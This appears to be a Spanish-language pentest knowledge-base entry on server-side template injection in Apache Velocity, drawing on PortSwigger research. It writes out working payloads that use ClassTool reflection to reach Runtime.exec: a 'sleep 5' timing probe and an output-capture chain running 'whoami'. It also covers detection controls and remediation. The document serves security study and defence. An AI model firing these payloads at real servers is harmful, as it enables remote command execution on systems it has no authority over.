---
clase: inyeccion
tech: velocity
cwe: CWE-1336
cvss: 9.8 # [derivado] RCE. La fuente declara NO considerarlo un fallo de Velocity
payload: |
  # ADVERTENCIA (H1): el render colapso los saltos de linea.
  #
  # ClassTool de Velocity, API documentada - LITERAL de la fuente:
  #   $class.inspect(class/object/string)
  #   $class.type
  #
  # SONDA POR RETARDO (confirma RCE sin canal de salida) - LITERAL de la fuente:
  $class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
  # La fuente muestra '[5 second time delay]' y salida '0'.
  #
  # CAPTURA DE SALIDA del comando - LITERAL de la fuente:
  #set($str=$class.inspect("java.lang.String").type)   #set($chr=$class.inspect("java.lang.Character").type)   #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))   $ex.waitFor()   #set($out=$ex.getInputStream())   #foreach($i in [1..$out.available()])   $str.valueOf($chr.toChars($out.read()))   #end
  # Salida LITERAL: tomcat7
  #
  # Mecanica: ClassTool da reflexion Java desde la plantilla. 'inspect' obtiene un
  # descriptor de clase y '.type' la clase real, desde la que se llama a cualquier
  # metodo estatico. Runtime.getRuntime().exec() es el destino.
  # La captura de salida es mas laboriosa que en FreeMarker porque Velocity no tiene
  # una clase 'Execute' que devuelva stdout: hay que leer el InputStream byte a byte y
  # reconstruir los caracteres con String.valueOf(Character.toChars(...)).
precondicion: "SSTI confirmada en Velocity con ClassTool disponible en el contexto de la plantilla. La fuente declara expresamente que NO considera este exploit una vulnerabilidad de Velocity: el motor expone reflexion por diseño. La vulnerabilidad es permitir que entrada del usuario llegue a la plantilla."
como_se_descubre: |
  La fuente NO da sonda de identificacion para Velocity (su arbol de decision por motor
  es una imagen). Si no se puede identificar el motor por otra via, la sonda de retardo
  sirve a la vez de identificacion y de confirmacion de RCE: si la respuesta tarda 5
  segundos, es Velocity con ClassTool y hay ejecucion.
  Esa doble funcion la hace la primera prueba razonable: una peticion decide identidad
  del motor E impacto. Y el retardo es observable sin canal de salida, lo que importa
  porque la captura de stdout en Velocity es mucho mas costosa que en FreeMarker.
  Fase 'Exploit' de la metodologia de la fuente aplicada aqui: 'Read' (leer la
  documentacion de ClassTool), 'Explore' (ver que clases son inspeccionables),
  'Attack' (Runtime.exec).
control_negativo: |
  # [derivado] diseño de test A/B
  # A: $class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
  #    -> retardo de ~5s = RCE confirmado
  # B: el mismo payload con exec("sleep 0").waitFor()
  #    -> SIN retardo, pero tambien sin error = ClassTool funciona y ejecuta
  # El par A/B es el control de temporizacion correcto: aisla que el retardo viene del
  # COMANDO y no del coste de la reflexion. Sin B, 5 segundos podrian ser el tiempo de
  # cargar clases por reflexion.
  # C: medir la latencia base del endpoint varias veces antes de A (ver la advertencia
  #    de varianza del writeup de retardos SQL: el mismo error aplica aqui).
mata: |
  - ClassTool no esta disponible en el contexto de la plantilla.
  - Gestor de seguridad de Java (SecurityManager) que impida Runtime.exec.
  - Sandbox de Velocity que restrinja las clases inspeccionables.
  - B tambien produce retardo -> el retardo no viene del comando.
  - El motor no es Velocity: el payload da error de sintaxis.
fuente: "https://portswigger.net/research/server-side-template-injection (James Kettle, publicado 2015-08-05, act. 2025-09-03). Payloads, API de ClassTool y salida literales. La fuente NO da sonda de identificacion para Velocity ni CVE ni recompensa para este caso."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] SSTI en Velocity — reflexión Java desde la plantilla hasta `Runtime.exec`

## Principio
Velocity expone ClassTool, una API documentada que da **reflexión Java** desde la
plantilla. `$class.inspect(...)` obtiene un descriptor de clase y `.type` la clase real,
desde la que se puede llamar a cualquier método estático. El destino evidente es
`Runtime.getRuntime().exec()`.

Igual que en FreeMarker, el motor hace lo que documenta. La vulnerabilidad es que entrada
del usuario llegue a la plantilla.

## Payload
Sonda por retardo, que confirma ejecución sin necesitar canal de salida:

```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
```

La fuente muestra `[5 second time delay]` y salida `0`.

Captura de la salida del comando:

```
#set($str=$class.inspect("java.lang.String").type)   #set($chr=$class.inspect("java.lang.Character").type)   #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))   $ex.waitFor()   #set($out=$ex.getInputStream())   #foreach($i in [1..$out.available()])   $str.valueOf($chr.toChars($out.read()))   #end
```

→ `tomcat7`

## Por qué la captura de salida es tan laboriosa aquí
FreeMarker trae una clase `Execute` que devuelve stdout directamente, y su payload cabe
en una línea. Velocity no tiene equivalente: hay que obtener el `InputStream`, leerlo
byte a byte y reconstruir los caracteres con `String.valueOf(Character.toChars(...))`.

Esa asimetría tiene una consecuencia práctica: en Velocity conviene **confirmar la
ejecución por retardo antes** de invertir en construir la captura de salida. Una sonda de
`sleep 5` cuesta una petición y una línea.

## La sonda de retardo hace doble trabajo
La fuente no da sonda de identificación para Velocity — su árbol de decisión por motor es
una imagen. Así que si el motor no se ha identificado por otra vía, el `sleep 5` resuelve
dos preguntas a la vez: *¿es Velocity con ClassTool?* y *¿hay ejecución de comandos?*

## El control que distingue el retardo del comando del coste de la reflexión
Repetir el payload con `sleep 0`. Si no hay retardo pero tampoco error, ClassTool
funciona y los 5 segundos del primer intento venían del comando. Sin ese control, el
retardo podría ser el coste de cargar clases por reflexión — y vale la pena medir la
latencia base del endpoint varias veces antes, por la misma razón que en el writeup de
retardos SQL: interpretar varianza como señal produce conclusiones coherentes y falsas.

## Impacto
Ejecución remota de comandos con los privilegios del proceso — `tomcat7` en el ejemplo.

## Remediación
Del paper: los sandboxes a nivel de parser son propensos a error y *"should not be relied
on except as a defense in depth measure"*. El enfoque de menor riesgo es un motor trivial
como Mustache. Si hay que aceptar plantillas de usuario, ejecutar el entorno en un
contenedor restringido con capacidades reducidas y sistema de ficheros de solo lectura.

`# [derivado]`: eliminar ClassTool del contexto de plantilla es la medida específica y
barata para este caso — la reflexión no tiene ningún uso legítimo en una plantilla de
presentación.
